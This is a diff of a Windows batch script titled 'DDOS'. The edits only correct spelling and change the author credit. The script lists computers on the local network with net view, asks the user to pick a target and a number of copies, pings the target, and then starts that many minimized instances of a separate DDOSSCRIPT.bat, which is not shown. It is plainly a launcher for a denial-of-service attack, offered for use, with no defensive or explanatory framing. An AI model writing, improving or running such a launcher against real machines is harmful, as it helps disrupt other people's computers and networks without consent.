@@ -1,26 +1,26 @@
-@echo off
+﻿@echo off
 title DDOS
 echo ___________________________
-echo Program by X̍ͭ́҉̦͓ 
+echo Program by Mohid "Meenit" Saeed and Dexter "dnighthawk" Gard
 echo ___________________________
-echo Loading Comps...
+echo Loading computers...
 net view
 set INPUT=
-set /P INPUT="Choose a comp. >"
+set /P INPUT="Choose a computer. >"
 set /P OPENNUM="Put in the number of apps. >"
 cls
-echo Scanning adress for authenticity
+echo Scanning address for authenticity
 echo %INPUT% > COMPID.txt
 ping %INPUT% > nul
 IF ERRORLEVEL 1 (
 color 4F
-echo It appears that that ip is invalid.
-echo Press any key to exit
+echo It appears that that IP is invalid.
+echo Press any key to exit.
 pause > nul
 exit
 )
 cls
-echo Ip is valid. Loading subscripts... [Note: Subscripts begin minimized. To stop DDOS, close out of all subscripts.]
+echo IP is valid. Loading subscripts... [Note: Subscripts begin minimized. To stop DDOS, close out of all subscripts.]
 for /L %%a in (1,1,%OPENNUM%) do (
 Start /min DDOSSCRIPT.bat
 )
